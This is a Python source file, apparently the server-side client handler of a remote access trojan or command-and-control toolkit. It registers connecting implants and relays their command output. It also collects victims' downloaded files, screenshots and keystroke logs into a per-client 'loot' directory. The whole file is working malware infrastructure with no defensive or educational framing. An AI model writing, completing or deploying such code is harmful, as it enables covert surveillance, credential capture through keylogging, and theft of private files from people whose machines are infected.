import threading
import os
import base64
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from common.protocol import recv_msg, send_msg, make_msg
from server.config import LOOT_DIR


class ClientHandler(threading.Thread):
    def __init__(self, sock, addr, server):
        super().__init__()
        self.sock = sock
        self.addr = addr
        self.server = server
        self.client_id = None
        self.info: dict = {}
        self.running = True
        self._send_lock = threading.Lock()

    def run(self):
        try:
            # First message must be register
            msg = recv_msg(self.sock)
            if msg.get("type") != "register":
                self.close()
                return
            self.info = msg.get("data", {})
            cid = self.server.register_client(self)
            print(f"[+] {cid} connected from {self.addr[0]} "
                  f"({self.info.get('hostname', '?')}, {self.info.get('os', '?')})")

            # Send welcome ack
            self.send(make_msg("status", {"status": "ok", "message": f"registered as {cid}"}))

            # Main message loop
            while self.running:
                msg = recv_msg(self.sock)
                self._dispatch(msg)
        except (ConnectionError, OSError, ValueError) as e:
            pass
        finally:
            if self.client_id:
                print(f"[-] {self.client_id} disconnected ({self.addr[0]})")
                self.server.unregister_client(self.client_id)
            self.close()

    def _dispatch(self, msg):
        mtype = msg.get("type", "")
        data = msg.get("data", {})
        rid = msg.get("id")

        handlers = {
            "cmd_result": self._handle_cmd_result,
            "upload_ack": self._handle_upload_ack,
            "download_result": self._handle_download_result,
            "screenshot_result": self._handle_screenshot_result,
            "keylog_data": self._handle_keylog_data,
            "heartbeat_ack": self._handle_heartbeat_ack,
            "status": self._handle_status,
        }
        handler = handlers.get(mtype)
        if handler:
            handler(data, rid)

    def send(self, msg):
        with self._send_lock:
            try:
                send_msg(self.sock, msg)
            except OSError:
                self.running = False

    def _client_loot_dir(self):
        path = os.path.join(LOOT_DIR, self.client_id or "unknown")
        os.makedirs(path, exist_ok=True)
        return path

    def _handle_cmd_result(self, data, rid):
        output = data.get("output", "")
        error = data.get("error", "")
        exit_code = data.get("exit_code", -1)
        if output:
            print(output, end="")
        if error:
            print(f"[stderr] {error}", end="")
        if exit_code != 0:
            print(f"[*] exit_code={exit_code}")

    def _handle_upload_ack(self, data, rid):
        status = data.get("status", "error")
        if status == "ok":
            print(f"[*] Upload ok: {data.get('path')} ({data.get('size', 0)} bytes)")
        else:
            print(f"[!] Upload failed: {data.get('message', 'unknown')}")

    def _handle_download_result(self, data, rid):
        status = data.get("status", "error")
        if status == "ok":
            path = data.get("path", "unknown")
            content_b64 = data.get("content", "")
            content = base64.b64decode(content_b64)
            local = os.path.join(self._client_loot_dir(), os.path.basename(path))
            with open(local, "wb") as f:
                f.write(content)
            print(f"[*] Downloaded {path} -> {local} ({len(content)} bytes)")
        else:
            print(f"[!] Download failed: {data.get('message', 'unknown')}")

    def _handle_screenshot_result(self, data, rid):
        status = data.get("status", "ok")
        if status == "ok":
            img_b64 = data.get("image", "")
            img = base64.b64decode(img_b64)
            local = os.path.join(self._client_loot_dir(), "screenshot.png")
            with open(local, "wb") as f:
                f.write(img)
            print(f"[*] Screenshot saved -> {local} ({len(img)} bytes)")
        else:
            print(f"[!] Screenshot failed: {data.get('message', 'unknown')}")

    def _handle_keylog_data(self, data, rid):
        keystrokes = data.get("keystrokes", "")
        local = os.path.join(self._client_loot_dir(), "keylog.txt")
        with open(local, "a", encoding="utf-8") as f:
            f.write(keystrokes)
        print(f"[*] Keylog appended -> {local} ({len(keystrokes)} chars)")

    def _handle_heartbeat_ack(self, data, rid):
        pass  # Silent

    def _handle_status(self, data, rid):
        status = data.get("status", "error")
        msg = data.get("message", "")
        if status == "ok":
            print(f"[*] {msg}")
        else:
            print(f"[!] Error: {msg}")

    def close(self):
        self.running = False
        try:
            self.sock.close()
        except OSError:
            pass
